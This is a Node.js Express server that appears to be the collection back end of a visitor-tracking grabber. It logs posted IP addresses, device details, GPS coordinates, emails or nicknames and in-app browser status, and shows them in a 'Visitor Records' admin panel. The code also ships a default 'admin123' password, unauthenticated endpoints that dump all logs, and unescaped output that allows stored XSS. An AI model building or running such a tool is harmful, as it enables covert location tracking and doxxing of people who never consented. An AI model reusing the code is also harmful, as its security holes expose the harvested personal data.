const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASS = process.env.ADMIN_PASSWORD || 'admin123';

const sessions = {};
let logHistory = [];
let lastData = null;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname)));

function genToken() {
    return crypto.randomBytes(16).toString('hex');
}

function isAuth(req) {
    const token = req.cookies?.admin_session;
    if (!token) return false;
    if (sessions[token] && sessions[token].expires > Date.now()) return true;
    return false;
}

app.post('/a', (req, res) => {
    const data = req.body;
    if (!data) return res.status(400).json({ s: 'e', m: 'No data' });
    
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    data.sip = clientIP;
    
    const entry = {
        ra: new Date().toISOString(),
        pl: data
    };
    
    logHistory.push(entry);
    lastData = data;
    
    try {
        fs.appendFileSync('data.log', `[${entry.ra}] ${JSON.stringify(data)}\n`, 'utf8');
    } catch (err) {
        console.error('File write error:', err.message);
    }
    
    console.log('Received:', JSON.stringify(data, null, 2));
    res.json({ s: 'ok', m: 'Logged' });
});

app.get('/login', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title>
        <style>
            body { font-family: Arial; background: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
            .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 300px; text-align: center; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
            button { padding: 12px 30px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; }
            .error { color: red; }
        </style>
        </head>
        <body>
        <div class="card">
            <h2>Admin Login</h2>
            <form method="POST" action="/login">
                <input type="password" name="password" placeholder="Enter admin password" required>
                <button type="submit">Login</button>
                <div class="error">${req.query.error ? 'Invalid password' : ''}</div>
            </form>
        </div>
        </body>
        </html>
    `);
});

app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASS) {
        const token = genToken();
        sessions[token] = { expires: Date.now() + 3600000 };
        res.cookie('admin_session', token, { httpOnly: true, maxAge: 3600000 });
        return res.redirect('/admin');
    }
    return res.redirect('/login?error=1');
});

app.get('/record/:id', (req, res) => {
    if (!isAuth(req)) return res.status(401).json({ e: 'Unauthorized' });
    const id = parseInt(req.params.id);
    if (isNaN(id) || id < 0 || id >= logHistory.length) {
        return res.status(404).json({ e: 'Not found' });
    }
    res.json(logHistory[id]);
});

app.get('/admin', (req, res) => {
    if (!isAuth(req)) return res.redirect('/login');
    
    let rows = '';
    if (logHistory.length === 0) {
        rows = '<tr><td colspan="7" style="text-align:center;">No records yet.</td></tr>';
    } else {
        logHistory.forEach((entry, index) => {
            const p = entry.pl;
            const ip = p.w?.public || p.sip || 'N/A';
            const device = (p.b?.ua || 'Unknown').substring(0, 60) + (p.b?.ua?.length > 60 ? '...' : '');
            const loc = p.loc ? `${p.loc.lat}, ${p.loc.lon} (acc: ${p.loc.acc || 'N/A'}m) [${p.loc.src}]` : 'Not shared';
            const email = p.email || p.nick || '—';
            const time = new Date(entry.ra).toLocaleString();
            const inApp = p.i?.any ? '⚠️ In-App' : '✅ Browser';
            rows += `<tr onclick="viewRec(${index})" style="cursor:pointer;">
                <td>${index + 1}</td>
                <td>${time}</td>
                <td>${ip}</td>
                <td style="font-size:12px; word-break:break-word;">${device}</td>
                <td>${loc}</td>
                <td>${email}</td>
                <td>${inApp}</td>
            </tr>`;
        });
    }

    const html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin - Visitor Records</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f7fa; margin: 20px; }
        .container { max-width: 1400px; margin: auto; background: white; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
        h1 { font-size: 24px; margin-bottom: 10px; color: #1a1a2e; }
        .meta { color: #666; font-size: 14px; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th { background: #1a73e8; color: white; padding: 12px 10px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #e9ecf2; vertical-align: middle; }
        tr:hover { background: #f0f4ff; }
        .logout { margin-top: 20px; }
        .logout a { color: #1a73e8; text-decoration: none; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.5); }
        .modal-content { background-color: white; margin: 5% auto; padding: 20px; border-radius: 12px; width: 80%; max-width: 900px; max-height: 80%; overflow-y: auto; box-shadow: 0 4px 30px rgba(0,0,0,0.3); }
        .close { float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
        .close:hover { color: #999; }
        .modal pre { background: #f5f7fa; padding: 15px; border-radius: 8px; white-space: pre-wrap; word-break: break-word; font-size: 13px; max-height: 500px; overflow-y: auto; }
        .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }
        .badge-gps { background: #e8f5e9; color: #2e7d32; }
        .badge-ip { background: #fff8e1; color: #f57f17; }
        .badge-none { background: #fff0f0; color: #c62828; }
    </style>
</head>
<body>
<div class="container">
    <h1>📊 Visitor Records</h1>
    <div class="meta">Total entries: <strong>${logHistory.length}</strong> &nbsp;|&nbsp; <a href="/logout">Logout</a></div>
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Time</th>
                <th>IP Address</th>
                <th>Device / Browser</th>
                <th>Location</th>
                <th>Email / Nick</th>
                <th>Browser Type</th>
            </tr>
        </thead>
        <tbody>${rows}</tbody>
    </table>
    <div class="footer" style="margin-top:20px; font-size:13px; color:#999;">Click on a row to view full data.</div>
</div>

<div id="recModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal()">&times;</span>
        <h3>Full Record Details</h3>
        <pre id="modalPayload">Loading...</pre>
    </div>
</div>

<script>
    function viewRec(id) {
        fetch('/record/' + id)
            .then(r => r.json())
            .then(data => {
                document.getElementById('modalPayload').textContent = JSON.stringify(data, null, 2);
                document.getElementById('recModal').style.display = 'block';
            })
            .catch(err => alert('Error: ' + err));
    }
    function closeModal() {
        document.getElementById('recModal').style.display = 'none';
    }
    window.onclick = function(e) {
        const modal = document.getElementById('recModal');
        if (e.target == modal) modal.style.display = 'none';
    }
</script>
</body>
</html>`;
    res.send(html);
});

app.get('/logout', (req, res) => {
    const token = req.cookies?.admin_session;
    if (token) {
        delete sessions[token];
        res.clearCookie('admin_session');
    }
    res.redirect('/login');
});

app.get('/records', (req, res) => {
    if (isAuth(req)) return res.redirect('/admin');
    res.redirect('/login');
});

app.get('/logs', (req, res) => {
    if (logHistory.length === 0) return res.status(404).json({ s: 'e', m: 'No logs' });
    res.json(logHistory);
});

app.get('/rawlog', (req, res) => {
    if (lastData) res.json(lastData);
    else res.status(404).json({ s: 'e', m: 'No data' });
});

app.get('/log', (req, res) => {
    if (fs.existsSync('data.log')) res.sendFile(path.join(__dirname, 'data.log'));
    else res.status(404).send('No log file');
});

app.get('/ip', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    res.json({ ip });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});